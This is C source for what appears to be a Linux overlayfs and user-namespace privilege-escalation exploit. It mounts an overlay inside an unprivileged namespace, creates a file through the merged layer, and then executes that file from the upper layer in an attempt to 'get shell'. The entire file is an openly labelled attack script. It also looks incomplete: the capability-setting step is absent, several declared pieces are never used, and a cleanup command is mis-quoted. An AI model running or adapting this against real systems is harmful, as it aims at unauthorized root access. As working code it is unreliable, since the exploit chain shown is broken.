#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/capability.h>
// #include <attr/xattr.h>
// #include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
#define DIR_BASE "./ovlcap"
#define DIR_WORK DIR_BASE "/work"
#define DIR_LOWER DIR_BASE "/lower"
#define DIR_UPPER DIR_BASE "/upper"
#define DIR_MERGE DIR_BASE "/merge"
#define BIN_MERGE DIR_MERGE "/magic"
#define BIN_UPPER DIR_UPPER "/magic"
static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}
static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t)strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xreadfile(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd == -1)
        err(1, "open %s", path);
    int len = 0;
    char data[0x100];
    while (read(fd, data + len, 1) > 0)
    {
        len++;
    }
    data[len] = '\0';
    puts(data);
    printf("len %d\n", len);
    close(fd);
}

void listCaps()
{
    cap_t caps = cap_get_proc();
    ssize_t y = 0;
    printf("The process %d was give capabilities %s\n", (int)getpid(), cap_to_text(caps, &y));
    fflush(0);
    cap_free(caps);
}

static int exploit()
{
    // init work;
    char buf[4096];
    sprintf(buf, "rm -rf '%s/*'", DIR_UPPER);
    system(buf);
    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK, 0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);
    // mount overlay
    uid_t uid = getuid();
    gid_t gid = getgid();
    printf("uid:%d gid:%d\n", uid, gid);
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");
    xwritefile("/proc/self/setgroups", "deny");
    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);
    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);
    else
        puts("[+] mount success");

    sprintf(buf, "ls -la %s", DIR_MERGE);
    system(buf);
    sprintf(buf, "%s/file", DIR_MERGE);
    int fd = open(buf, O_WRONLY | O_CREAT, 0666); // touch file
    if (fd < 0)
        perror("open");
    close(fd);

    // close fuse
    // kill(pid, SIGINT);
    return 0;
}
int main(int argc, char *argv[])
{
    int pid = fork();
    int stat;
    if (pid == 0)
    {
        exploit();
        exit(0);
    }
    wait(&stat);
    // get shell
    puts("[+] exploit success!");
    char buf[0x100];
    sprintf(buf, "%s/file", DIR_UPPER);
    system(buf);
    return 0;
}
